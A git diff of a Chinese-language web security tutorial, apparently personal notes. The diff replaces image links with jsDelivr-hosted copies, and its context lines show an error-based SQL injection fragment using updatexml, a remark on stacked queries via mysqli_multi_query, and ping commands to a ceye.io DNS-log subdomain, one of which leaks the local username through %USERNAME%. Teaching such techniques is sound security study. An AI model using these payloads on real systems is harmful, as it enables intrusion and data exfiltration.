@@ -83,7 +83,7 @@ INSERT INTO users (username,password) VALUES ('这是用户名' and updatexml(1,
 
 ![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/1da7a938cb9fcb83fae70daf82dd4ae1.png)
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/1335ee271441adfcb5b0b63cc7696235.png)
+![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/1335ee271441adfcb5b0b63cc7696235.png)
 
 在数据库中这样执行是没有问题的，但是如果在实战中，都是通过网站插入注入语句，那么这个时候就得看这个网站当前的脚本支不支持多语句查询，也就是有没有使用mysqli_multi_query函数(该函数支持多SQL语句查询)。
 
@@ -132,7 +132,7 @@ payload：
 
 ping test.分配给的地址.ceye.io //test是随便改的，后面是固定的
 
-![image-20251114161246308](C:\Users\pwn\AppData\Roaming\Typora\typora-user-images\image-20251114161246308.png)
+![image-20251114161246308](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251114161246308.png)
 
 ping %USERNAME%.分配地址.ceye.io //%USERNAME%获取本地计算机用户名的
 
